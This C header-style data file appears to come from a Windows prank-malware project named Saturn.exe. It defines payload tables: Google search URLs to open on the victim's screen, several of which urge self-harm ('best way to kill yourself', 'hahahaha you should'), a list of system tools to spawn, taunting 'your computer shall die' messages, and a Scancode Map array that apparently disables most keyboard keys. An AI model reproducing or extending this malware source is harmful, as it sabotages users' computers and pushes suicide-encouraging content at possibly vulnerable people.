#include "Saturn.h"

CONST CHAR *sites[] = {
	"https://google.co.ck/search?q=what+happens+when+you+kill+a+cat",
	"https://google.co.ck/search?q=will+a+cats+soul+come+for+revenge",
	"https://google.co.ck/search?q=yes,+they+will+bitch",
	"https://google.co.ck/search?q=hello+idiot,+how+is+your+computer",
	"https://google.co.ck/search?q=best+way+to+kill+yourself",
	"https://google.co.ck/search?q=how+2+remove+a+virus",
	"https://google.co.ck/search?q=what+happens+if+you+delete+system32",
	"https://google.co.ck/search?q=my+computer+is+doing+weird+things+what+the+fuck+is+happening+pls+help",
	"https://google.co.ck/search?q=how+i+kill",
	"https://google.co.ck/search?q=i+killed+a+cat",
	"https://google.co.ck/search?q=never+ever+kill+a+cat+bitch",
	"https://google.co.ck/search?q=65536",
	"https://google.co.ck/search?q=systemparametersinfo+c+winapi",
	"https://google.co.ck/search?q=exitwindowsex+c+winapi",
	"https://google.co.ck/search?q=terminateprocess+c+winapi",
	"https://google.co.ck/search?q=writefile+c+winapi",
	"https://google.co.ck/search?q=shellexecute+c+winapi",
	"https://google.co.ck/search?q=how+powerful+is+saturn",
	"https://google.co.ck/search?q=how+powerful+is+soni",
	"https://google.co.ck/search?q=can+a+cat+eat+a+human",
	"https://google.co.ck/search?q=can+a+cat+kill+a+human",
	"https://google.co.ck/search?q=should+you+kill+a+cat",
	"https://google.co.ck/search?q=can+i+kill+soni",
	"https://google.co.ck/search?q=you+cannot+kill+soni",
	"https://google.co.ck/search?q=for+the+fact+that+you+killed+soni+your+computer+will+die",
	"https://google.co.ck/search?q=how+can+i+stop+malware",
	"https://google.co.ck/search?q=malwarebytes+free+download",
	"https://google.co.ck/search?q=no+antimalwares+will+save+you+now+and+never",
	"https://google.co.ck/search?q=will+a+malware+kill+computer",
	"https://google.co.ck/search?q=how+to+save+computer+when+saturn.exe+infected+it",
	"https://google.co.ck/search?q=you+can+never+save+your+computer",
	"https://google.co.ck/search?q=thats+what+you+get+for+killing+soni",
	"https://google.co.ck/search?q=beheading+videos",
	"https://google.co.ck/search?q=i+want+to+kill+myself",
	"https://google.co.ck/search?q=hahahaha+you+should",
	"https://google.co.ck/search?q=symptoms+of+low+testosterone",
	"https://google.co.ck/search?q=flunitrazepam+uses",
	"https://google.co.ck/search?q=how+to+kill+myself",
	"https://google.co.ck/search?q=how+to+recover+private+data+deleted+by+saturn.exe",
	"https://google.co.ck/search?q=how+many+days+till+december+11",
};
CONST SIZE_T nSites = sizeof(sites) / sizeof(VOID *);

CONST CHAR *progs[] = {
	"calc",
	"notepad",
	"write",
	"explorer",
	"taskmgr",
	"msconfig",
	"mspaint",
	"devmgmt.msc",
	"control",
	"mmc",
	"powershell",
};

CONST SIZE_T nProgs = sizeof(progs) / sizeof(VOID *);

CONST CHAR *sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation",
	"SystemAsterisk",
};

CONST SIZE_T nSounds = sizeof(sounds) / sizeof(VOID *);

static CONST LPSTR CatWrite = "No coaxing rubs, no plaintive cry\r\nWill say it�s time for feeding.\r\nI�ve put away your bowl, and all\r\nThe things you won�t be needing\r\nThey will not go quietly,\r\nthe cats who�ve shared our lives,\r\nIn subtle ways they let us know\r\ntheir spirit still survives.\r\nAnd think of her as living,\r\nIn the hearts of those she touched,\r\nFor nothing loved is ever lost,\r\nAnd she was loved so much,\r\nSo hold me now just one more time,\r\nand let me hear you say,\r\nbecause you care so much for me,\r\nyou�ll let me go today.\r\nFor with your love I was so blessed for all those many years.\r\nThere is no pain, I suffer not, the fear now all is gone.\r\nAnd when you and your special friend meet, you take him in your arms and embrace.\r\nNo stone stands over where he lies.\r\nIt is on our hearts that his life is engraved\r\nI dread that day,\r\nOne year from now,\r\nThat first marking of the time,\r\nThat your body was no longer with us,\r\nThough we will never forget you,\r\nYour tangible memory fades,\r\nThe feel of your fur, your head, your back, your weight against us,\r\nThe smell and sounds of you when, You were here.\r\nI�m the first bright blossom you�ll see in the spring,\r\nThe first warm raindrop that April will bring.\r\nI�m the first ray of light when the sun starts to shine,\r\nAnd you�ll see that the face in the moon is mine.\r\nYour face is kissed again and again and again,\r\nand you look once more into the eyes of your trusting pet.\r\nThen you cross the Rainbow Bridge together...\r\nNever again to be separated.\r\nAnd although time may bring new friends and a new food dish to fill,\r\nThat one place in our hearts belongs to them... and always will.\r\nI�ll miss you for a little while,\r\nbut our friendship will not end.\r\nTime will pass, and then at last, you�ll be on my lap again.\r\n\r\nYOU KILLED MY SONI, THERE IS NO ESCAPE";
static CONST LPSTR Writebuff = "YOU THOUGHT YOUR COMPUTER WOULD ESCAPE, HAHAHA, YOU THOUGHT. YOUR COMPUTER IS MINE, YOU CANNOT GET RID OF THIS MALWARE. FOR KILLING SONI, YOUR COMPUTER SHALL DIE.\r\n\r\nTHERE IS NO ESCAPE";

// Test GDI Data Code.
CONST CHAR *augustgdi[] = {
	"SRCCOPY",
	"SRCERASE",
	"SRCINVERT",
	"SRCPAINT",
	"NOTSRCCOPY",
	"NOTSRCERASE",
};

CONST SIZE_T nAugustGDI = sizeof(augustgdi) / sizeof(VOID *);

// Scancode Map.
CONST HEX scankeysarray[] = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x71, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x00,
	0x00,
	0x3B,
	0x00,
	0x00,
	0x00,
	0x3C,
	0x00,
	0x00,
	0x00,
	0x3D,
	0x00,
	0x00,
	0x00,
	0x3E,
	0x00,
	0x00,
	0x00,
	0x3F,
	0x00,
	0x00,
	0x00,
	0x40,
	0x00,
	0x00,
	0x00,
	0x41,
	0x00,
	0x00,
	0x00,
	0x42,
	0x00,
	0x00,
	0x00,
	0x43,
	0x00,
	0x00,
	0x00,
	0x44,
	0x00,
	0x00,
	0x00,
	0x57,
	0x00,
	0x00,
	0x00,
	0x58,
	0x00,
	0x00,
	0x00,
	0x37,
	0xE0,
	0x00,
	0x00,
	0x46,
	0x00,
	0x00,
	0x00,
	0x52,
	0xE0,
	0x00,
	0x00,
	0x47,
	0xE0,
	0x00,
	0x00,
	0x49,
	0xE0,
	0x00,
	0x00,
	0x51,
	0xE0,
	0x00,
	0x00,
	0x4F,
	0xE0,
	0x00,
	0x00,
	0x53,
	0xE0,
	0x00,
	0x00,
	0x48,
	0xE0,
	0x00,
	0x00,
	0x4B,
	0xE0,
	0x00,
	0x00,
	0x50,
	0xE0,
	0x00,
	0x00,
	0x4D,
	0xE0,
	0x00,
	0x00,
	0x52,
	0x00,
	0x00,
	0x00,
	0x53,
	0x00,
	0x00,
	0x00,
	0x51,
	0x00,
	0x00,
	0x00,
	0x50,
	0x00,
	0x00,
	0x00,
	0x4F,
	0x00,
	0x00,
	0x00,
	0x4B,
	0x00,
	0x00,
	0x00,
	0x4C,
	0x00,
	0x00,
	0x00,
	0x4D,
	0x00,
	0x00,
	0x00,
	0x4E,
	0x00,
	0x00,
	0x00,
	0x49,
	0x00,
	0x00,
	0x00,
	0x48,
	0x00,
	0x00,
	0x00,
	0x47,
	0x00,
	0x00,
	0x00,
	0x45,
	0x00,
	0x00,
	0x00,
	0x35,
	0xE0,
	0x00,
	0x00,
	0x37,
	0x00,
	0x00,
	0x00,
	0x4A,
	0x00,
	0x00,
	0x00,
	0x29,
	0x00,
	0x00,
	0x00,
	0x02,
	0x00,
	0x00,
	0x00,
	0x03,
	0x00,
	0x00,
	0x00,
	0x04,
	0x00,
	0x00,
	0x00,
	0x05,
	0x00,
	0x00,
	0x00,
	0x06,
	0x00,
	0x00,
	0x00,
	0x07,
	0x00,
	0x00,
	0x00,
	0x08,
	0x00,
	0x00,
	0x00,
	0x09,
	0x00,
	0x00,
	0x00,
	0x0A,
	0x00,
	0x00,
	0x00,
	0x0B,
	0x00,
	0x00,
	0x00,
	0x0C,
	0x00,
	0x00,
	0x00,
	0x0D,
	0x00,
	0x00,
	0x00,
	0x0F,
	0x00,
	0x00,
	0x00,
	0x10,
	0x00,
	0x00,
	0x00,
	0x11,
	0x00,
	0x00,
	0x00,
	0x13,
	0x00,
	0x00,
	0x00,
	0x16,
	0x00,
	0x00,
	0x00,
	0x17,
	0x00,
	0x00,
	0x00,
	0x19,
	0x00,
	0x00,
	0x00,
	0x1A,
	0x00,
	0x00,
	0x00,
	0x1B,
	0x00,
	0x00,
	0x00,
	0x2B,
	0x00,
	0x00,
	0x00,
	0x28,
	0x00,
	0x00,
	0x00,
	0x27,
	0x00,
	0x00,
	0x00,
	0x26,
	0x00,
	0x00,
	0x00,
	0x25,
	0x00,
	0x00,
	0x00,
	0x24,
	0x00,
	0x00,
	0x00,
	0x22,
	0x00,
	0x00,
	0x00,
	0x21,
	0x00,
	0x00,
	0x00,
	0x3A,
	0x00,
	0x00,
	0x00,
	0x2A,
	0x00,
	0x00,
	0x00,
	0x1D,
	0x00,
	0x00,
	0x00,
	0x5B,
	0xE0,
	0x00,
	0x00,
	0x38,
	0x00,
	0x00,
	0x00,
	0x2C,
	0x00,
	0x00,
	0x00,
	0x2D,
	0x00,
	0x00,
	0x00,
	0x2E,
	0x00,
	0x00,
	0x00,
	0x2F,
	0x00,
	0x00,
	0x00,
	0x30,
	0x00,
	0x00,
	0x00,
	0x32,
	0x00,
	0x00,
	0x00,
	0x33,
	0x00,
	0x00,
	0x00,
	0x34,
	0x00,
	0x00,
	0x00,
	0x35,
	0x00,
	0x00,
	0x00,
	0x36,
	0x00,
	0x00,
	0x00,
	0x1D,
	0xE0,
	0x00,
	0x00,
	0x5D,
	0xE0,
	0x00,
	0x00,
	0x5C,
	0xE0,
	0x00,
	0x00,
	0x38,
	0xE0,
	0x00,
	0x00,
	0x59,
	0x00,
	0x00,
	0x00,
	0x65,
	0xE0,
	0x00,
	0x00,
	0x21,
	0xE0,
	0x00,
	0x00,
	0x6B,
	0xE0,
	0x00,
	0x00,
	0x5E,
	0xE0,
	0x00,
	0x00,
	0x5F,
	0xE0,
	0x00,
	0x00,
	0x6A,
	0xE0,
	0x00,
	0x00,
	0x69,
	0xE0,
	0x00,
	0x00,
	0x68,
	0xE0,
	0x00,
	0x00,
	0x67,
	0xE0,
	0x00,
	0x00,
	0x32,
	0xE0,
	0x00,
	0x00,
	0x6C,
	0xE0,
	0x00,
	0x00,
	0x6D,
	0xE0,
	0x00,
	0x00,
	0x66,
	0xE0,
	0x00,
	0x00,
	0x20,
	0xE0,
	0x00,
	0x00,
	0x2E,
	0xE0,
	0x00,
	0x00,
	0x2C,
	0xE0,
	0x00,
	0x00,
	0x30,
	0xE0,
	0x00,
	0x00,
	0x19,
	0xE0,
	0x00,
	0x00,
	0x10,
	0xE0,
	0x00,
	0x00,
	0x24,
	0xE0,
	0x00,
	0x00,
	0x22,
	0xE0,
	0x00,
	0x00,
	0x00,
	0x00
};

CONST SIZE_T scankeysarray_len = sizeof(scankeysarray);